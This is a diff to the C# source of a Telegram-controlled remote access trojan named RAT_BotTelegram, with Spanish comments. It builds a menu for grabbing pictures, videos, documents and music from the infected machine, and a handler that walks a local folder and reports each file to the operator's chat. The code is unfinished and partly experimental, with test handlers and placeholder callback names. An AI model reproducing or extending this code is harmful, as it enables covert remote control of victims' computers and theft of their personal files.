@@ -1,5 +1,6 @@
 ﻿using RAT_BotTelegram.Lib;
 using System;
+using System.Configuration;
 using System.IO;
 using System.Linq;
 using System.Reflection;
@@ -14,6 +15,9 @@ using Telegram.Bot.Types.ReplyMarkups;
 namespace RAT_BotTelegram {
     class Program {
         private static readonly TelegramBotClient Bot = new TelegramBotClient(config.TToken);
+
+       
+
         // Debes escribir el ID, para que el bot solo te responda a tí.
         static void Main(string[] args) {
 
@@ -93,35 +97,41 @@ namespace RAT_BotTelegram {
                 //    break;
 
                 case "/Get_Files":  // Menú Obtiene archivos
+                    //foreach (var file in Tools.GetFile(@"O:\Estoo")) {
+                    //    FileInfo info = new FileInfo(file);
 
+                    //    var archivo = new InlineKeyboardMarkup(new[] { InlineKeyboardButton.WithCallbackData(text: info + "", callbackData: "GetDocument") });
+
+                    //    await Bot.SendTextMessageAsync(config.id, "Se obtuvo...", replyMarkup: archivo);
+                    //    //await Bot.SendTextMessageAsync(config.id, "" + "https://cenfotec.s3-us-west-2.amazonaws.com/prod/wpattchs/2013/04/web-tec-virtual.pdf");
+                    //}
                     var GetFiles = new InlineKeyboardMarkup(new[]{
-                        new []{
-                            InlineKeyboardButton.WithCallbackData(
-                                text:"Get Pictures",
-                                callbackData: "GetPictures"),
-                            InlineKeyboardButton.WithCallbackData(
-                                text:"Get Videos",
-                                callbackData: "GetVideos"),
-                        },new []{
-                            InlineKeyboardButton.WithCallbackData(
-                                text:"Get Documents",
-                                callbackData: "GetDocument"),
-                            InlineKeyboardButton.WithCallbackData(
-                                text:"Get Music",
-                                callbackData: "GetMusic"),
-                        },new []{
-                            InlineKeyboardButton.WithCallbackData(
-                                text:"Get Download",
-                                callbackData: "formato"),
-                        }
-                    });
+                    new[]{
+                        InlineKeyboardButton.WithCallbackData(
+                            text: "Get Pictures",
+                            callbackData: "GetPictures"),
+                        InlineKeyboardButton.WithCallbackData(
+                            text: "Get Videos",
+                            callbackData: "GetVideos"),
+                    },new[]{
+                        InlineKeyboardButton.WithCallbackData(
+                            text:"Get Documents",
+                            callbackData: "GetDocument"),
+                        InlineKeyboardButton.WithCallbackData(
+                            text:"Get Music",
+                            callbackData: "GetMusic"),
+                    },new[]{
+                        InlineKeyboardButton.WithCallbackData(
+                            text:"Get Download",
+                            callbackData: "getDownload")
+                    }});
 
+            //var GetFiles = new InlineKeyboardMarkup
 
+            //await Bot.SendTextMessageAsync(config.id, " NOTE: Absolutely all files will be obtained.");
+            await Bot.SendTextMessageAsync(config.id, "Get files from?", replyMarkup: GetFiles);
+                   // await Bot.SendTextMessageAsync(config.id, "NOTE: The process of obtaining files can take many minutes per file. \n[Depends on the upload speed of the computer]");
 
-
-
-
-                    await Bot.SendTextMessageAsync(config.id, "Get files from?", replyMarkup: GetFiles);
                     break;
                 //Mensaje por default
                 default:
@@ -137,54 +147,60 @@ namespace RAT_BotTelegram {
                   "\n" +
                   "\n" +
                   "\n" +
-                  "\n" +
-                  "\n" +
-                  "\n" +
-                  "\n" +
-                  "\n" +
-                  "\n" +
-                  "\n" +
-                  "\n" +
-                  "\n" +
-                  "\n" +
-                  "\n" +
-                  "\n" +
-                  "\n" +
-                  "\n" +
-                  "\n" +
-                  "\n" +
-                  "\n" +
-                  "\n" +
-                  "\n" +
                   "";
-
                     await Bot.SendTextMessageAsync(config.id,text: usage,replyMarkup: new ReplyKeyboardRemove());
                     break;
             }
         }
         private static async void BotOnCallbackQueryReceived(object sender, CallbackQueryEventArgs callbackQueryEventArgs) {
             var callbackQuery = callbackQueryEventArgs.CallbackQuery;
-
+ 
             switch (callbackQuery.Data) {
-                case "keyboard":
+                
+                case "GetDocument":
+                    await Bot.SendTextMessageAsync(config.id, "******************** Start ********************** ");
+                    foreach (var file in Tools.GetFile(@"O:\Estoo")) {
+                        FileInfo info = new FileInfo(file);
+                        await Bot.SendTextMessageAsync(config.id, "<| "+file+info+" |>\n" + "https://cenfotec.s3-us-west-2.amazonaws.com/prod/wpattchs/2013/04/web-tec-virtual.pdf");
+                    }
+                    await Bot.SendTextMessageAsync(config.id, "******************** Finish ********************* ");
+                    break;
+
+
+                case "GetDocumenttgert":
+                    await Bot.SendLocationAsync(
+                        chatId: callbackQuery.Message.Chat.Id,
+                        latitude: 9.932551f,
+                        longitude: -84.031086f
+                        );
+                    break;
+
+                //      text: "Get Pictures",
+                //      callbackData: "GetPictures"),
+                //    InlineKeyboardButton.WithCallbackData(
+                //        text: "Get Videos",
+                //        callbackData: "GetVideos"),
+                //},new []{
+                //    InlineKeyboardButton.WithCallbackData(
+                //        text:"Get Documents",
+                //        callbackData: "GetDocument"),
+                //    InlineKeyboardButton.WithCallbackData(
+                //        text:"Get Music",
+                //        callbackData: "GetMusic"),
+                //},new []{
+                //    InlineKeyboardButton.WithCallbackData(
+                //        text:"Get Download",
+                //        callbackData: "getDownload"),
+                case "GetDocumensdfdst":
+                    await Bot.SendDocumentAsync(chatId: callbackQuery.Message.Chat.Id,document: "https://cenfotec.s3-us-west-2.amazonaws.com/prod/wpattchs/2013/04/web-tec-virtual.pdf");
+
                     ReplyKeyboardMarkup tipoContacto = new[]
                     {
                         new[] { "Opción 1", "Opción 2" },
                         new[] { "Opción 3", "Opción 4" },
                     };
 
-                    await Bot.SendTextMessageAsync(
-                        chatId: callbackQuery.Message.Chat.Id,
-                        text: "Keyboard personalizado",
-                        replyMarkup: tipoContacto);
-                    break;
-
-                case "ubicacion":
-                    await Bot.SendLocationAsync(
-                        chatId: callbackQuery.Message.Chat.Id,
-                        latitude: 9.932551f,
-                        longitude: -84.031086f
-                        );
+                    await Bot.SendTextMessageAsync(chatId: callbackQuery.Message.Chat.Id, text: "Keyboard personalizado", replyMarkup: tipoContacto);
                     break;
 
                 case "venue":
